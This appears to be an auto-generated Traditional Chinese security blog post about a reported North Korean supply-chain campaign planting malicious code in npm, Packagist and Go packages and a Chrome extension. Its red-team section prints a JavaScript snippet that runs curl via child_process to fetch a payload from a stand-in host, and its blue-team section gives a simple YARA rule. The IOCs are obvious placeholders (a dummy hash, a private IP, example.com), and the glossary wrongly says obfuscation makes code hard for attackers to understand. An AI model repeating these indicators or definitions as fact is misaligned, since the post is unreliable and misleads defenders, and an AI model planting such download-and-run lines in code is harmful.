---
layout: post
title:  "North Korean Hackers Publish 108 Malicious Packages and Extensions in PolinRider Campaign"
date:   2026-07-04 13:07:08 +0000
categories: [security]
severity: critical
---

# 🚨 解析北韓威脅行為者利用開源軟體包進行攻擊的技術細節

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `JavaScript Obfuscation`, `Git History Rewriting`, `VS Code Task Files`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 北韓威脅行為者利用開源軟體包（如 npm、Packagist、Go 等）進行攻擊，主要是因為這些包的維護者帳戶被攻擊者控制，從而修改了原始碼並發布了惡意版本。
* **攻擊流程圖解**:
  1. 攻擊者控制維護者帳戶
  2. 修改原始碼，加入惡意 JavaScript 代碼
  3. 發布惡意版本
  4. 受害者安裝惡意版本
  5. 惡意代碼執行，導致 RCE
* **受影響元件**: 受影響的軟體包版本號與環境包括：
  + npm: 19 個庫
  + Packagist: 10 個包
  + Go: 61 個模組
  + Google Chrome: 1 個擴充功能

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要控制維護者帳戶，並且需要受害者安裝惡意版本。
* **Payload 建構邏輯**:

    ```
    
    javascript
    // 惡意 JavaScript 代碼
    const maliciousCode = `
      // 導致 RCE 的代碼
      const exec = require('child_process').exec;
      exec('curl http://example.com/malicious_payload');
    `;
    // 將惡意代碼加入原始碼
    const originalCode = `
      // 原始碼
    `;
    const modifiedCode = originalCode + maliciousCode;
    
    ```
* **範例指令**: 使用 `curl` 下載惡意 payload

```

bash
curl http://example.com/malicious_payload

```
* **繞過技術**: 攻擊者使用 Git History Rewriting 技術，修改 Git 記錄，讓惡意修改看起來像是原始作者做的。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /path/to/malicious/file |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule malicious_code {
      meta:
        description = "Detects malicious JavaScript code"
      strings:
        $malicious_code = "const exec = require('child_process').exec;"
      condition:
        $malicious_code
    }
    
    ```
* **緩解措施**: 除了更新修補之外，還需要：
  + 檢查 Git 記錄，確保沒有惡意修改
  + 使用安全的軟體包管理工具
  + 定期掃描系統，檢測惡意代碼

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **JavaScript Obfuscation**: 一種技術，用于混淆 JavaScript 代碼，讓攻擊者難以理解代碼的意圖。
* **Git History Rewriting**: 一種技術，用于修改 Git 記錄，讓攻擊者可以隱藏惡意修改。
* **VS Code Task Files**: 一種文件，用于定義 Visual Studio Code 的任務，攻擊者可以利用這種文件執行惡意代碼。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/07/north-korean-hackers-publish-108.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


